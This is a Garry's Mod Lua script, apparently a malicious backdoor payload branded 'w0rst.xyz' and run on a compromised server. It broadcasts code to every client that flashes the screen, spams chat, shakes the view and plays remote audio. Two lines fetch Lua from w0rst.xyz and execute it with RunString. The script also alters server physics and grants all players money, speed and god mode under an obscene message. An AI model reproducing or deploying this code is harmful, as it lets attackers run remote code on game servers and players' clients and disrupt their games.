BroadcastLua("hook.Add('HUDPaint', 'Rainbow', function() local cin = math.sin(CurTime() * 10) * 255 surface.SetDrawColor(Color(cin, -cin, cin, 50)) surface.DrawRect(0, 0, ScrW(), ScrH()) end)")
BroadcastLua("hook.Add('Tick', 'Spam', function() chat.AddText(Color(math.Rand(50,200), math.Rand(50,200), math.Rand(50,200)), 'w0rst.xyz - wmenu-memento') end)")
BroadcastLua("hook.Add('Tick','ShakeScreen', function() local me = Player(LocalPlayer():UserID()) me:ConCommand('escape') util.ScreenShake(me:GetPos(), 10, 10, 99999, 9999999) end)")
BroadcastLua("sound.PlayURL('https://w0rst.xyz/project/sounds/mlg.mp3', 'mono', function(station) station:Play() end)")
BroadcastLua("http.Fetch('https://w0rst.xyz/project/func/extras/req/wlogo.lua', RunString)")
BroadcastLua("http.Fetch('https://w0rst.xyz/project/func/extras/req/floatingfood.lua', RunString)")
RunConsoleCommand('sv_friction', -2)
RunConsoleCommand('sv_gravity', 300)
RunConsoleCommand('sv_airaccelerate', 999)

for k,v in pairs(player.GetAll()) do
    timer.Simple(1, function()
        v.addMoney(1000000000)
        v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
        v:SetMaxSpeed(2222); v:SetRunSpeed(2222)
        v:SetJumpPower(999); v:GodEnable()
        DarkRP.notify(v, 0, 2.5, "w0rst.xyz - Get Fucked")
    end)
end
